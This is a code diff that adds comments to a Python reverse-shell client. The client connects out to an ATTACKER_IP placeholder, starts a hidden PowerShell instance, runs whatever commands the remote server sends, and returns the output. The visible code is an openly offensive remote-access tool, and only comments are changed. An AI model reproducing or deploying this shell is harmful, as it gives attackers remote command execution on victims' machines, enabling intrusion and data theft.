@@ -5,6 +5,7 @@ import time
 
 ATTACKER_IP = "x"
 def powershell_handler(connection):
+    # creating da powershell instance
     powershell_instance = subprocess.Popen(
         ["powershell.exe", "-NoLogo", "-NoProfile"],
         stdin=subprocess.PIPE,
@@ -17,6 +18,7 @@ def powershell_handler(connection):
 
     buffer = []
 
+    # helper to read ps stdoutput
     def read():
         while True:
             try:
@@ -27,20 +29,24 @@ def powershell_handler(connection):
             except:
                 break
 
+    # multi-threading to allow stdout reading to run while other functions are running
     threading.Thread(target=read).start()
 
     while True:
         try:
 
+            # recieve the command from server
             command = connection.recv(1024).decode().strip()
             if command.lower() == "exit":
                 powershell_instance.kill()
                 break
 
+            # write the command to ps instance
             powershell_instance.stdin.write(command + "\n")
             powershell_instance.stdin.flush()
             time.sleep(0.5)
 
+            # send back result of the command
             output = ''.join(buffer)
             buffer.clear()
             connection.send(output.encode())
